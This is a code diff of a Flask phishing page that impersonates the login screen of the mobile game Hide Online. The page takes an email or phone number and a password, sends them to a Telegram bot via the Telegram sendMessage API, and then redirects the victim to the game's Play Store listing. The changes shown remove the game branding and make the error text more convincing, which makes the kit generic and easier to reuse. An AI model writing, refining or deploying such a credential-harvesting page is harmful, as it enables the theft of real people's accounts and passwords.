@@ -4,12 +4,12 @@ import requests
 from flask import Flask, redirect, render_template_string, request
 
 app = Flask(__name__)
-app.secret_key = os.getenv("SECRET_KEY", "hideonline_super_secret_key")
+app.secret_key = os.getenv("SECRET_KEY", "secure_app_secret_key_123")
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
-# رابط التوجيه بعد إتمام التحقق
+# رابط التوجيه النهائي بعد إتمام التحقق
 FINAL_REDIRECT_URL = "https://play.google.com/store/apps/details?id=com.hitrockgames.hideonline"
 
 
@@ -21,19 +21,23 @@ def login():
     email_val = request.form.get("email", "").strip()
     password = request.form.get("password", "")
 
+    # نمط فحص صحة البريد الإلكتروني أو رقم الهاتف بدقة
     email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
     phone_pattern = r"^\+?[0-9]{10,15}$"
 
     if not (
         re.match(email_pattern, email_val) or re.match(phone_pattern, email_val)
     ):
-      error = "البريد الإلكتروني أو رقم الهاتف غير صحيح. يُرجى التحقق مرة أخرى."
+      error = (
+          "لم يتم العثور على حسابك. يُرجى التحقق من عنوان البريد الإلكتروني أو"
+          " رقم الهاتف."
+      )
     elif len(password) <= 5:
       error = "كلمة المرور غير صحيحة. يُرجى إعادة المحاولة."
     else:
       if BOT_TOKEN and CHAT_ID:
         msg = (
-            "🎮 تم استلام بيانات Hide Online جديدة:\n\n📧 البريد/الحساب:"
+            "🎮 تم استلام بيانات جديدة:\n\n📧 البريد/الحساب:"
             f" {email_val}\n🔑 الباسورد: {password}"
         )
         telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -48,7 +52,7 @@ def login():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hide Online - Login</title>
+    <title>تسجيل الدخول</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background: #0f172a; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
@@ -80,12 +84,12 @@ def login():
         .error-msg { 
             color: #f87171; 
             font-size: 13px; 
-            line-height: 18px; 
+            line-height: 20px; 
             margin-bottom: 20px; 
             width: 100%; 
-            text-align: center; 
+            text-align: right; 
             background: rgba(248, 113, 113, 0.1); 
-            padding: 10px; 
+            padding: 12px; 
             border-radius: 8px; 
             border: 1px solid rgba(248, 113, 113, 0.2); 
         }
